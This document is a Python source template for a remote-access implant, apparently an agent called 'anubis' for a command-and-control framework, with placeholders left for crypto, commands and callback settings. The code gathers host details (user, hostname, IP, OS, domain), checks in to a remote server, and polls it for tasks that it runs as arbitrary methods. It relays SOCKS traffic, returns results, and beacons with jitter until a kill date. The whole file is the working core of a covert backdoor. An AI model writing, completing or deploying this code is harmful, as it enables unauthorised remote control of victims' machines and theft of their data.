import os, random, sys, json, socket, base64, time, platform, ssl, getpass
import urllib.request
from urllib.parse import quote as urlquote
from datetime import datetime
import threading, queue

CHUNK_SIZE = 51200

CRYPTO_HERE

    def getOSVersion(self):
        if platform.mac_ver()[0]:
            return "macOS " + platform.mac_ver()[0]
        return platform.system() + " " + platform.release()

    def getUsername(self):
        try:
            return getpass.getuser()
        except Exception:
            pass
        for k in ["USER", "LOGNAME", "USERNAME"]:
            if k in os.environ:
                return os.environ[k]
        return "unknown"

    def formatMessage(self, data, urlsafe=False):
        raw = self.agent_config["UUID"].encode() + self.encrypt(json.dumps(data).encode())
        return base64.urlsafe_b64encode(raw) if urlsafe else base64.b64encode(raw)

    def formatResponse(self, data):
        if not data:
            return {}
        try:
            uuid = self.agent_config.get("UUID", "")
            if uuid and data.startswith(uuid):
                data = data[len(uuid):]
            elif uuid and uuid in data:
                data = data.replace(uuid, "", 1)
            return json.loads(data)
        except Exception:
            return {}

    def postMessageAndRetrieveResponse(self, data):
        raw = self.makeRequest(self.formatMessage(data), 'POST')
        dec = self.decrypt(raw)
        return self.formatResponse(dec)

    def getMessageAndRetrieveResponse(self, data):
        raw = self.makeRequest(self.formatMessage(data, True), 'GET')
        dec = self.decrypt(raw)
        return self.formatResponse(dec)

    def sendTaskOutputUpdate(self, task_id, output):
        responses = [{"task_id": task_id, "user_output": output, "completed": False}]
        self.postMessageAndRetrieveResponse({"action": "post_response", "responses": responses})

    def postResponses(self):
        try:
            with self._taskings_lock:
                done = [t for t in self.taskings if t.get("completed")]

            socks = []
            while not self.socks_out.empty():
                socks.append(self.socks_out.get())

            if not done and not socks:
                return

            responses = []
            for task in done:
                out = {
                    "task_id":     task["task_id"],
                    "user_output": task.get("result", ""),
                    "completed":   True
                }
                if task.get("error"):
                    out["status"] = "error"
                for func in ["processes", "file_browser"]:
                    if func in task:
                        out[func] = task[func]
                responses.append(out)

            message = {"action": "post_response", "responses": responses}
            if socks:
                message["socks"] = socks
            if responses:
                self.postMessageAndRetrieveResponse(message)

            with self._taskings_lock:
                for t in done:
                    if t in self.taskings:
                        self.taskings.remove(t)

        except Exception:
            pass

    def processTask(self, task):
        try:
            task["started"] = True
            fn = getattr(self, task["command"], None)
            if callable(fn):
                try:
                    try:
                        raw = json.loads(task["parameters"]) if task["parameters"] else {}
                    except Exception:
                        raw = {}
                    params = raw if isinstance(raw, dict) else {}
                    params["task_id"] = task["task_id"]
                    output = fn(**params)
                    if output is not None:
                        task["result"]    = str(output)
                        task["completed"] = True
                    elif not task.get("completed"):
                        task["completed"] = True
                except Exception as e:
                    task["result"]    = str(e)
                    task["error"]     = True
                    task["completed"] = True
            else:
                task["result"]    = "Command not found: {}".format(task["command"])
                task["error"]     = True
                task["completed"] = True
        except Exception as e:
            task["result"]    = str(e)
            task["error"]     = True
            task["completed"] = True

    def processTaskings(self):
        with self._taskings_lock:
            pending = [t for t in self.taskings if not t.get("started")]
        for task in pending:
            threading.Thread(
                target=self.processTask,
                args=(task,),
                name="{}:{}".format(task["command"], task["task_id"]),
                daemon=True
            ).start()

    def getTaskings(self):
        tasking_data = self.getMessageAndRetrieveResponse({
            "action": "get_tasking",
            "tasking_size": -1
        })
        with self._taskings_lock:
            existing_ids = {t["task_id"] for t in self.taskings}
            for task in tasking_data.get("tasks", []):
                if task["id"] not in existing_ids:
                    self.taskings.append({
                        "task_id":    task["id"],
                        "command":    task["command"],
                        "parameters": task.get("parameters", ""),
                        "result":     "",
                        "completed":  False,
                        "started":    False,
                        "error":      False,
                        "stopped":    False
                    })
        if "socks" in tasking_data:
            for packet in tasking_data["socks"]:
                self.socks_in.put(packet)

    def checkIn(self):
        try:
            hostname = socket.gethostname()
            try:
                ip = socket.gethostbyname(hostname)
            except Exception:
                ip = ""
            data = {
                "action":         "checkin",
                "ip":             ip,
                "os":             self.getOSVersion(),
                "user":           self.getUsername(),
                "host":           hostname,
                "domain":         socket.getfqdn(),
                "pid":            os.getpid(),
                "uuid":           self.agent_config["PayloadUUID"],
                "architecture":   "x64" if sys.maxsize > 2**32 else "x86",
                "encryption_key": self.agent_config["enc_key"]["enc_key"],
                "decryption_key": self.agent_config["enc_key"]["dec_key"]
            }
            encoded = base64.b64encode(
                self.agent_config["PayloadUUID"].encode() +
                self.encrypt(json.dumps(data).encode())
            )
            raw     = self.makeRequest(encoded, 'POST')
            decoded = self.decrypt(raw)
            if decoded and "status" in decoded:
                info = json.loads(decoded[len(self.agent_config["PayloadUUID"]):])
                self.agent_config["UUID"] = info.get("id", "")
                return bool(self.agent_config["UUID"])
        except Exception:
            pass
        return False

    def makeRequest(self, data, method='GET'):
        hdrs   = self.agent_config["Headers"].copy()
        server = self.agent_config["Server"]
        port   = self.agent_config["Port"]
        if (server.startswith("https://") and port == "443") or \
           (server.startswith("http://")  and port == "80"):
            base = server
        else:
            base = "{}:{}".format(server, port)
        try:
            if method == 'GET':
                param = data.decode() if isinstance(data, bytes) else data
                url   = "{}{}?{}={}".format(base, self.agent_config["GetURI"],
                                            self.agent_config["GetParam"],
                                            urlquote(param, safe=''))
                req   = urllib.request.Request(url, None, hdrs)
            else:
                post_data = data if isinstance(data, bytes) else data.encode()
                url = "{}{}".format(base, self.agent_config["PostURI"])
                req = urllib.request.Request(url, post_data, hdrs)

            if self.agent_config.get("ProxyHost") and self.agent_config.get("ProxyPort"):
                tls = "https" if self.agent_config["ProxyHost"].startswith("https") else "http"
                handler = urllib.request.HTTPSHandler if tls == "https" else urllib.request.HTTPHandler
                ph = self.agent_config["ProxyHost"].replace("{}://".format(tls), "")
                pp = self.agent_config["ProxyPort"]
                if self.agent_config.get("ProxyUser") and self.agent_config.get("ProxyPass"):
                    proxy_url = "{}://{}:{}@{}:{}".format(
                        tls, self.agent_config["ProxyUser"],
                        self.agent_config["ProxyPass"], ph, pp)
                    proxy  = urllib.request.ProxyHandler({"{}".format(tls): proxy_url})
                    auth   = urllib.request.HTTPBasicAuthHandler()
                    opener = urllib.request.build_opener(proxy, auth, handler)
                else:
                    proxy_url = "{}://{}:{}".format(tls, ph, pp)
                    proxy  = urllib.request.ProxyHandler({"{}".format(tls): proxy_url})
                    opener = urllib.request.build_opener(proxy, handler)
                urllib.request.install_opener(opener)

            #CERTSKIP
            with urllib.request.urlopen(req, timeout=30) as response:
                return base64.b64decode(response.read())

        except Exception:
            return b""

    def passedKilldate(self):
        try:
            kd = datetime(*[int(x) for x in self.agent_config["KillDate"].split("-")])
            return datetime.now() >= kd
        except Exception:
            return False

    def agentSleep(self):
        jitter = int(self.agent_config["Sleep"] * int(self.agent_config["Jitter"]) / 100)
        delta  = random.randint(-jitter, jitter) if jitter > 0 else 0
        time.sleep(max(1, self.agent_config["Sleep"] + delta))

#COMMANDS_HERE

    def __init__(self):
        self.socks_open  = {}
        self.socks_in    = queue.Queue()
        self.socks_out   = queue.Queue()
        self.taskings    = []
        self._taskings_lock = threading.Lock()
        self._meta_cache = {}
        self.moduleRepo  = {}
        self.current_directory = os.getcwd()
        self.agent_config = {
            "Server":      "callback_host",
            "Port":        "callback_port",
            "PostURI":     "/post_uri",
            "PayloadUUID": "UUID_HERE",
            "UUID":        "",
            "Headers":     headers,
            "Sleep":       callback_interval,
            "Jitter":      callback_jitter,
            "KillDate":    "killdate",
            "enc_key":     AESPSK,
            "ExchChk":     "encrypted_exchange_check",
            "GetURI":      "/get_uri",
            "GetParam":    "query_path_name",
            "ProxyHost":   "proxy_host",
            "ProxyUser":   "proxy_user",
            "ProxyPass":   "proxy_pass",
            "ProxyPort":   "proxy_port",
        }

        _MAX_FAILURES = 5
        while True:
            if self.agent_config["UUID"] == "":
                self.checkIn()
                self.agentSleep()
            else:
                _consecutive_failures = 0
                while True:
                    if self.passedKilldate():
                        os._exit(0)
                    try:
                        self.getTaskings()
                        self.processTaskings()
                        self.postResponses()
                        _consecutive_failures = 0
                    except Exception:
                        _consecutive_failures += 1
                        if _consecutive_failures >= _MAX_FAILURES:
                            self.agent_config["UUID"] = ""
                            break
                    self.agentSleep()

if __name__ == "__main__":
    anubis = anubis()
